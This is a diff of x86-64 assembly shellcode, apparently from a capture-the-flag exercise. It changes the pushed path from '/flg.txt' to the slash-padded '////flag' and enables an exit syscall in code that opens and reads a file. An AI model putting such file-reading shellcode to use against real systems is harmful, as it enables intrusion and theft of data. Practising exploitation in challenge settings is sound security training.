@@ -5,7 +5,7 @@ _start:
     ; push './flg.txt\x00'
     xor rdi, rdi
     push rdi              ; push NULL string terminator
-    mov rdi, '/flg.txt' ; rest of file name
+    mov rdi, '////flag' ; rest of file name
     push rdi            ; push to stack 
     
     ; open('rsp', 'O_RDONLY')
@@ -28,7 +28,7 @@ _start:
     syscall
 
     ; exit
-    ; mov eax, 60
-    ; xor rdi, rdi
-    ; syscall
+    mov eax, 60
+    xor rdi, rdi
+    syscall
 
